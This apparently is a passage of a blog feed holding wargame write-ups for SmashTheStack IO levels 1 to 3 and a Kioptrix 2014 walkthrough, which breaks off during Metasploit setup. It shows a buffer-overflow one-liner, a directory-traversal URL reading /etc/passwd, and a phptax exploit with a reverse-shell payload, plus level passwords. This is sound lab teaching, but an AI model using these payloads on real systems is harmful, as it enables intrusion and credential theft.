</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span> <span class="o">||</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">)</span>
</span><span class='line'>                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">memcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
</span><span class='line'>        <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">-</span> <span class="mi">4</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;This is exciting we&#39;re going to %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">functionpointer</span><span class="p">);</span>
</span><span class='line'>        <span class="n">functionpointer</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h4>Function overview</h4>

<p><strong>memcpy</strong></p>

<p><em>void <em>memcpy(void </em>dest, const void *src, size_t n);</em></p>

<p>Copies  <em>n</em> bytes from memory area <em>src</em> to memory area <em>dest</em>. The memory areas must not overlap.</p>

<p>The function does not check for any terminating null character in <em>src</em>.</p>

<p>Returns a pointer to <em>dest</em>.</p>

<p><strong>memset</strong></p>

<p><em>void <em>memset(void </em>buf, int value, size_t count);</em></p>

<p><em>buf</em> = Pointer to the block of memory to fill.</p>

<p><em>value</em> = Value to be set. The value is passed as an int, but the function fills the block of memory using the unsigned char conversion of this value.</p>

<p><em>count</em> = Number of bytes to be set to the value.</p>

<p>Sets the first <em>count</em> bytes of the block of memory pointed by <em>buf</em> to the specified <em>value</em></p>

<p>Returns a pointer to the memory area <em>buf</em></p>

<p>The most common use of <em>memset()</em> is to initialize a region of memory to some known value.</p>

<h4>Program description</h4>

<p>Running the program we see this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>This is exciting we're going to 0x80484a4
</span><span class='line'>I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474</span></code></pre></td></tr></table></div></figure>


<p>So we know the bad function address is at 0x80484a4 and the good function address is at 0x8048474. A function pointer is set to point to the address of the bad function. The program checks for an argument that is at least 4 in length. Then memset sets all except the last 4 bytes of the buffer to 0. There is a buffer overflow in how the program copies the argument to the buffer, without checking for boundaries. This will be key in exploiting the binary.</p>

<p>I proceeded through feeding a string to the program that I created with <code>pattern_create.rb</code>. Then I ran the program with GDB:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x63413563 in ?? ()</span></code></pre></td></tr></table></div></figure>


<p>So EIP points to some junk that I provided with the string. Let&rsquo;s check the offset:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./pattern_offset.rb 0x63413563
</span><span class='line'>[*] Exact match at offset 76</span></code></pre></td></tr></table></div></figure>


<p>Excellent! Since we already have the address we need for the good function that will spawn us a shell, the next step is simple:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level3@io:/levels$ ./level03 $(python -c 'print "A" * 76 + "\x74\x84\x04\x08"')
</span><span class='line'>This is exciting we're going to 0x8048474
</span><span class='line'>Win.
</span><span class='line'>sh-4.2$ whoami
</span><span class='line'>level4
</span><span class='line'>sh-4.2$ cat /home/level4/.pass
</span><span class='line'>9C4Jxjc3O3IjB7nXej</span></code></pre></td></tr></table></div></figure>


<p>We hijacked the execution flow and made EIP point to the address of the function we needed.</p>

<blockquote><p>The surest protection against temptation is cowardice.</p>

<p>&mdash; Mark Twain</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SmashTheStack IO Level 2]]></title>
    <link href="http://chousensha.github.io/blog/2014/07/03/smashthestack-io-level-2/"/>
    <updated>2014-07-03T23:51:49+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/07/03/smashthestack-io-level-2</id>
    <content type="html"><![CDATA[<p>For level 2, there are two programs that can be used to advance, and we have access to source code! Let&rsquo;s check the first one.</p>

<!-- more -->


<p>The source code for level02.c is as follows:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="c1">//a little fun brought to you by bla</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;signal.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;setjmp.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">catcher</span><span class="p">(</span><span class="kt">int</span> <span class="n">a</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>        <span class="n">setresuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span><span class="n">geteuid</span><span class="p">(),</span><span class="n">geteuid</span><span class="p">());</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;WIN!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;source code is available in level02.c</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">3</span> <span class="o">||</span> <span class="o">!</span><span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span>
</span><span class='line'>                <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>        <span class="n">signal</span><span class="p">(</span><span class="n">SIGFPE</span><span class="p">,</span> <span class="n">catcher</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">abs</span><span class="p">(</span><span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="o">/</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h4>Function overview</h4>

<p><strong>atoi</strong></p>

<p><em>int atoi(const char *str);</em></p>

<p>Converts the string argument to an integer. The string must contain a valid integer number. If this is not the case, the returned value is undefined.</p>

<p>The number can be terminated by any character that cannot be part of an integer number. This includes white space, punctuation, and characters.</p>

<p>Returns 0 if the string can&rsquo;t be converted to a valid integer.</p>

<p><strong>abs</strong></p>

<p><em>int abs (int n);</em></p>

<p>Returns the absolute value of an integer.</p>

<p>Trying to take the absolute value of the most negative integer is not defined.</p>

<p><strong>signal</strong></p>

<p><em>typedef void (*sighandler_t)(int);</em></p>

<p><em>sighandler_t signal(int signum, sighandler_t handler);</em></p>

<p>Sets a function as a handler for the signal. That function will be called when the program receives the signal.</p>

<p>The function can be a specific function or one of the following macros:</p>

<p><strong>SIG_DFL</strong> Default signal handling: the default action associated with the signal occurs.</p>

<p><strong>SIG_IGN</strong> Ignore the signal</p>

<p>According  to  POSIX, the behavior of a process is undefined after it ignores a SIGFPE, SIGILL, or SIGSEGV signal that was not generated by kill(2) or raise(3).  Integer division by zero has undefined result.  On some architectures it will  generate  a  SIGFPE signal.  (Also dividing the most negative integer by -1 may generate SIGFPE.)  Ignoring this signal might lead to an endless loop.</p>

<p>The effects of signal() in a multithreaded process are unspecified.</p>

<p><strong>SIGFPE</strong>      (Signal Floating-Point Exception) Erroneous arithmetic operation, such as zero divide or an operation resulting in overflow (not necessarily with a floating-point operation).</p>

<h4>Program description</h4>

<p>We can see from the code that the program is looking for 2 arguments, with the second being a valid <em>atoi</em> converted integer, and it returns the absolute value of the result of the division between the first and second arguments. The <em>catcher</em> function is registered as handler for the SIGFPE signal, and we want it to get called. At first glance, this should be possible by doing a zero division. But we can&rsquo;t use 0 for our second argument, because the program checks for <em>atoi</em> returning 0.</p>

<p>From the man page, we know that SIGFPE may be generated if we divide the most negative integer by -1, so let&rsquo;s try that:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level2@io:/levels$ ./level02 -2147483648 -1
</span><span class='line'>source code is available in level02.c
</span><span class='line'>
</span><span class='line'>WIN!
</span><span class='line'>sh-4.2$ cat /home/level3/.pass
</span><span class='line'>Ib3F7i7FqjziuDOBKi</span></code></pre></td></tr></table></div></figure>


<p>It worked! Now let&rsquo;s look at the alternate way. This is the source for level02_alt.c:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cm">/* submitted by noname */</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="cp">#define answer 3.141593</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>  <span class="kt">float</span> <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="n">argc</span> <span class="o">-</span> <span class="mi">2</span><span class="p">)</span><span class="o">?:</span> <span class="n">strtod</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;You provided the number %f which is too &quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="n">a</span> <span class="o">&lt;</span> <span class="n">answer</span><span class="p">)</span>
</span><span class='line'>                 <span class="n">puts</span><span class="p">(</span><span class="s">&quot;low&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">a</span> <span class="o">&gt;</span> <span class="n">answer</span><span class="p">)</span>
</span><span class='line'>                <span class="n">puts</span><span class="p">(</span><span class="s">&quot;high&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">else</span>
</span><span class='line'>                <span class="n">execl</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="s">&quot;sh&quot;</span><span class="p">,</span> <span class="s">&quot;-p&quot;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h4>Function overview</h4>

<p><strong>strtod</strong></p>

<p><em>double strtod(const char *str, char **endptr);</em></p>

<p>Converts the string to double and returns the result. Any character that cannot be part of a floating-point number will end the parsing. A pointer to the rest of the string after the last valid character is stored in the object pointed by <em>endptr</em>. If no conversion is performed, 0 is returned and the value of <em>str</em> is stored in the location referenced by <em>endptr</em>.</p>

<h4>Program description</h4>

<p>The program will spawn a shell if we provide it with the exact match for answer. But it&rsquo;s not as straightforward as passing 3.141593 to it, when I did that, I got the message that it was too low. I added a printf to the code, and I couldn&rsquo;t see any difference in rounding, but since this is a no-go, there has to be something else. Looking more closely at the manpage:</p>

<blockquote><p>The expected form of the (initial portion of the) string is optional
leading white space as recognized by isspace(3), an optional plus (&lsquo;+&rsquo;)
or minus sign (&lsquo;&ndash;&rsquo;) and then either (i) a decimal number, or (ii) a
hexadecimal number, or (iii) an infinity, or (iv) a NAN (not-a-number).</p>

<p>A NAN is &ldquo;NAN&rdquo; (disregarding case) optionally followed by &lsquo;(&rsquo;, a
sequence of characters, followed by &lsquo;)&rsquo;.  The character string specifies in an implementation-dependent way the type of NAN.</p></blockquote>

<p>Passing it nan gives us the shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level2@io:/levels$ ./level02_alt nan
</span><span class='line'>sh-4.2$ whoami
</span><span class='line'>level3</span></code></pre></td></tr></table></div></figure>


<p>Cookie:</p>

<blockquote><p>Your temporary financial embarrassment will be relieved in a surprising manner.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SmashTheStack IO Level 1]]></title>
    <link href="http://chousensha.github.io/blog/2014/07/03/smashthestack-io-level-1/"/>
    <updated>2014-07-03T19:24:36+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/07/03/smashthestack-io-level-1</id>
    <content type="html"><![CDATA[<p>There are different wargames hosted on <a href="http://smashthestack.org/">http://smashthestack.org/</a> , with IO being the most popular of them. The missions revolve around debugging and reversing binaries in order to exploit some software vulnerabilities and gain enough privileges to read the password for the next level.</p>

<!-- more -->


<p>To connect to the first level, you have to SSH to the box with the password of <strong>level1</strong>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh level1@io.smashthestack.org</span></code></pre></td></tr></table></div></figure>


<p>If you are new to these wargames, read the README file, which has some additional explanations. Levels for this game can be found in <code>/levels</code> and passwords are located in the level&rsquo;s home directory, like <code>/home/level2/.pass</code></p>

<p>So, when trying to run the <em>level01</em> binary, we can see it&rsquo;s looking for a passcode:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level1@io:/levels$ ./level01
</span><span class='line'>Enter the 3 digit passcode to enter:</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see what&rsquo;s going on using GDB. This is the disassembly of the main() function for this program:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) disas main
</span><span class='line'>Dump of assembler code for function main:
</span><span class='line'>   0x08048080 &lt;+0&gt;:     push   $0x8049128
</span><span class='line'>   0x08048085 &lt;+5&gt;:     call   0x804810f &lt;puts&gt;
</span><span class='line'>   0x0804808a &lt;+10&gt;:    call   0x804809f &lt;fscanf&gt;
</span><span class='line'>   0x0804808f &lt;+15&gt;:    cmp    $0x10f,%eax
</span><span class='line'>   0x08048094 &lt;+20&gt;:    je     0x80480dc &lt;YouWin&gt;
</span><span class='line'>   0x0804809a &lt;+26&gt;:    call   0x8048103 &lt;exit&gt;
</span><span class='line'>End of assembler dump.</span></code></pre></td></tr></table></div></figure>


<p>This line is interesting:</p>

<p><strong>cmp    $0x10f,%eax</strong></p>

<p>So there is a comparison between a constant and <em>eax</em>, and if they&rsquo;re equal, it means that we&rsquo;re right on the password. Let&rsquo;s check that constant:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) p 0x10f
</span><span class='line'>$2 = 271</span></code></pre></td></tr></table></div></figure>


<p>This makes sense, 0x10f is the hex representation of 271 in decimal. And we know the program is looking for a 3-digit passcode. Let&rsquo;s try it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level1@io:/levels$ ./level01
</span><span class='line'>Enter the 3 digit passcode to enter: 271
</span><span class='line'>Congrats you found it, now read the password for level2 from /home/level2/.pass
</span><span class='line'>sh-4.2$ cat /home/level2/.pass
</span><span class='line'>hgvbmkQIHavkGg5wyk</span></code></pre></td></tr></table></div></figure>


<p>Ok, this was an easy level!</p>

<blockquote><p>Q:    How many hardware engineers does it take to change a light bulb?
A:    None.  We&rsquo;ll fix it in software.</p>

<p>Q:    How many system programmers does it take to change a light bulb?
A:    None.  The application can work around it.</p>

<p>Q:    How many software engineers does it take to change a light bulb?
A:    None.  We&rsquo;ll document it in the manual.</p>

<p>Q:    How many tech writers does it take to change a light bulb?
A:    None.  The user can figure it out.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kioptrix 2014]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/27/kioptrix-2014/"/>
    <updated>2014-06-27T19:01:09+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/27/kioptrix-2014</id>
    <content type="html"><![CDATA[<p>Right when I thought I was finished with the Kioptrix vulnerable machines, I discovered there is a new addition to the series! This is great, because I really enjoyed the Kioptrix challenges! So let&rsquo;s dive in!</p>

<!-- more -->


<p>First, if you have problems with booting it up, check out the fix and instructions from <a href="http://vulnhub.com/entry/kioptrix_2014-5,62/">http://vulnhub.com/entry/kioptrix_2014-5,62/</a></p>

<p>Let&rsquo;s fire Nmap:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -A -p1-65535 192.168.127.130
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 ( http://nmap.org ) at 2014-06-27 19:14 EEST
</span><span class='line'>Nmap scan report for 192.168.127.130
</span><span class='line'>Host is up (0.0031s latency).
</span><span class='line'>Not shown: 65532 filtered ports
</span><span class='line'>PORT     STATE  SERVICE VERSION
</span><span class='line'>22/tcp   closed ssh
</span><span class='line'>80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
</span><span class='line'>| http-methods: Potentially risky methods: TRACE
</span><span class='line'>|_See http://nmap.org/nsedoc/scripts/http-methods.html
</span><span class='line'>|_http-title: Site doesn't have a title (text/html).
</span><span class='line'>8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
</span><span class='line'>|_http-methods: No Allow or Public header in OPTIONS response (status code 403)
</span><span class='line'>|_http-title: 403 Forbidden
</span><span class='line'>MAC Address: 00:0C:29:BB:7C:98 (VMware)
</span><span class='line'>Device type: general purpose
</span><span class='line'>Running: FreeBSD 7.X|8.X|9.X
</span><span class='line'>OS CPE: cpe:/o:freebsd:freebsd:7 cpe:/o:freebsd:freebsd:8 cpe:/o:freebsd:freebsd:9
</span><span class='line'>OS details: FreeBSD 7.0-RELEASE - 9.0-RELEASE</span></code></pre></td></tr></table></div></figure>


<p>Next I used the browser to check what is being hosted on ports 80 and 8080. On port 80 there is just an &ldquo;It works!&rdquo; message, and on port 8080 I got the Forbidden message. But on port 80&rsquo;s page source code, there is a comment revealing additional functionality:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;META</span> <span class="na">HTTP-EQUIV=</span><span class="s">&quot;refresh&quot;</span> <span class="na">CONTENT=</span><span class="s">&quot;5;URL=pChart2.1.3/index.php&quot;</span><span class="nt">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/pchart.png" title="pchart" alt="pchart"></p>

<p>Searching for pChart reveals that this version is affected by <a href="http://www.exploit-db.com/exploits/31173/">directory traversal and XSS</a></p>

<p>So we can read any file that the web server is sufficiently privileged to read with the following string:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.127.130/pChart2.1.3/examples/index.php?Action=View&Script=/../../etc/passwd</span></code></pre></td></tr></table></div></figure>


<p>In this case, there wasn&rsquo;t much information that could be of further use, and I wasn&rsquo;t able to read /etc/shadow, which was to be expected. Fortunately, the Apache configuration file is helpful. Since this is a FreeBSD system, the file is located in <code>/usr/local/etc/apache2x/httpd.conf</code> , <em>x</em> being the version number. At the moment, the only thing I could find interesting was this part at the very end of the file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser
</span><span class='line'>
</span><span class='line'>&lt;VirtualHost *:8080&gt;
</span><span class='line'>    DocumentRoot /usr/local/www/apache22/data2
</span><span class='line'>
</span><span class='line'>&lt;Directory "/usr/local/www/apache22/data2"&gt;
</span><span class='line'>    Options Indexes FollowSymLinks
</span><span class='line'>    AllowOverride All
</span><span class='line'>    Order allow,deny
</span><span class='line'>    Allow from env=Mozilla4_browser
</span><span class='line'>&lt;/Directory&gt;</span></code></pre></td></tr></table></div></figure>


<p>So it appears that a certain user agent receives special treatment! Let&rsquo;s verify this by changing the UA (I used the User Agent Switcher add-on for Firefox). And when I went to <a href="http://192.168.127.130:8080/">http://192.168.127.130:8080/</a> , there was a directory index for something called phptax! No more forbidden errors!</p>

<p><img class="center" src="http://chousensha.github.io/images/phptax.png" title="phptax" alt="phptax"></p>

<p>So, <a href="http://sourceforge.net/projects/phptax/">the program</a> is used to generate PDFs. The good news (for us, not for the dilligent tax payers) is that it&rsquo;s <a href="http://www.exploit-db.com/exploits/21665/">vulnerable to remote code execution</a>, and there&rsquo;s also a Metasploit module available for it:</p>

<p><strong>PhpTax pfilez Parameter Exec Remote Code Injection</strong></p>

<blockquote><p>This module exploits a vulnerability found in PhpTax, an income tax report
generator. When generating a PDF, the icondrawpng() function in drawimage.php does
not properly handle the pfilez parameter, which will be used in a exec() statement,
and then results in arbitrary remote code execution
under the context of the web  server. Please note: authentication is not required to exploit this vulnerability.</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/multi/http/phptax_exec
</span><span class='line'>msf exploit(phptax_exec) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/multi/http/phptax_exec):
</span><span class='line'>
</span><span class='line'>   Name       Current Setting  Required  Description
</span><span class='line'>   ----       ---------------  --------  -----------
</span><span class='line'>   Proxies                     no        Use a proxy chain
</span><span class='line'>   RHOST                       yes       The target address
</span><span class='line'>   RPORT      80               yes       The target port
</span><span class='line'>   TARGETURI  /phptax/         yes       The path to the web application
</span><span class='line'>   VHOST                       no        HTTP server virtual host
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   PhpTax 0.8
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(phptax_exec) &gt; set RHOST 192.168.127.130
</span><span class='line'>RHOST =&gt; 192.168.127.130
</span><span class='line'>msf exploit(phptax_exec) &gt; set RPORT 8080
</span><span class='line'>RPORT =&gt; 8080
</span><span class='line'>msf exploit(phptax_exec) &gt; set payload cmd/unix/reverse 
</span><span class='line'>payload =&gt; cmd/unix/reverse
